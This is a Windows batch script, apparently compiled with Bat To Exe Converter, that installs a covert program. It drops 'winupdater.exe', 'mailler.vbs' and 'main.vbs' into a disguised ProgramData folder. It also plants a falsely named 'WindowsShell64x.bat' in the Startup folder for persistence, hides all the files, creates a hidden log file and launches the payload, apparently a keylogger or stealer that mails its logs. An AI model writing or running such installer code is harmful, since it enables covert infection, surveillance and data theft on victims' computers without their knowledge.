::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcBCQNXiuOpoS7czp5vyCnm8IRuc+bY3X27CyA+EH71f0fJoh12hmq8QZHhhdQh+qZwF6v2xR1g==
::fBE1pAF6MU+EWHreyHcjLQlHcBCQNXiuOpoS7czp5vyCnm8IRuc+bY3X27CyA+EH71f0fJoh12hmq8QZHhhdQgWiYBokrW9Ws3bLMt+Z0w==
::fBE1pAF6MU+EWHreyHcjLQlHcBCQNXiuOpoS7czp5vyCnm8IRuc+bY3X27CyA+EH71f0fJoh12hmq8QZHhhdQh+qZwM4rHwMoGaWVw==
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFA9GRReWAES0A5EO4f7+08iSsEgcQeAzeYvn+bWaJfID40nodIQR9XtOndkcBRdUfwDmRQotpWFFsWGXecKEtm8=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off


rem By: Kat9_123


rem Creates a new directory
mkdir C:\ProgramData\wndwspdtr 

rem Puts 'winupdater.exe' in the new directory
move winupdater.exe C:\ProgramData\wndwspdtr
rem Puts 'mailler.vbs' in the new directory
move mailler.vbs C:\ProgramData\wndwspdtr
rem Puts 'main.vbs' in the new directory
move main.vbs C:\ProgramData\wndwspdtr

rem Go's to the startup folder
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
rem Creates 'WindowsShell64x.bat'
@echo @echo off>>WindowsShell64x.bat
@echo cd C:\ProgramData\wndwspdtr>>WindowsShell64x.bat
@echo start main.vbs>>WindowsShell64x.bat

rem Makes 'WindowsShell64x.bat' invisible
attrib +h WindowsShell64x.bat




rem Go's to the directory
cd C:\ProgramData\wndwspdtr
rem Makes 'mailler.vbs' invisible
attrib +h mailler.vbs
rem Makes 'maill.vbs' invisible
attrib +h winupdater.exe
rem Makes 'mailler.vbs' invisible
attrib +h main.vbs
rem Creates the 'dat.txt' file
@echo Log: >>dat.txt
rem Makes it invisible
attrib +h dat.txt
rem Starts 'main.vbs'
start main.vbs




